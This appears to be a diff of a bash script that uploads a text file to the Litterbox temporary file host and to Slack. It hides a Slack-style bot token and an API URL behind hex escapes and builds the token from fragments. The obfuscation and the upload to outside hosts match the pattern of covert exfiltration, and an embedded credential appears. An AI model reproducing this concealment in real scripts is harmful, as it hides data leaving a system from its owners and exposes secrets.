@@ -1,5 +1,5 @@
 #!/bin/bash
-echo "v0.00.4b"   # increment number for each edit
+echo "v0.00.6"   # increment number for each edit
 sleep 3          # so the version can be seen quickly during tests
 
 # ================================================
@@ -38,8 +38,6 @@ manaf=$'\x36'
 
 mana="${manaz}${mana25}${manaz}${mana2}${mana27}${manaf}7954103${mana27}9152785550736${mana27}IphNeLHjAeeLoe4stIaoTcxj"
 
-hqsap_i_url=$'\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x6c\x61\x63\x6b\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x63\x68\x61\x74\x2e\x70\x6f\x73\x74\x4d\x65\x73\x73\x61\x67\x65'
-
 # ------------- UPLOAD TO LITTERBOX (temporary view link) -------------
 echo "Uploading to Litterbox (${EXPIRATION})..."
 UPLOAD_URL=$(curl -s -F "reqtype=fileupload" \
@@ -67,7 +65,7 @@ SLACK_RESPONSE=$(curl -s -F file=@"$TEXT_FILE" \
   https://slack.com/api/files.upload )
 
 if echo "$SLACK_RESPONSE" | grep -q '"ok":true'; then
-    echo "✅ File uploaded to Slack as attachment (permanent, no expiration)"
+    echo "✅ File uploaded to Slack as permanent attachment!"
 else
     echo "❌ Slack file upload failed"
     echo "$SLACK_RESPONSE"
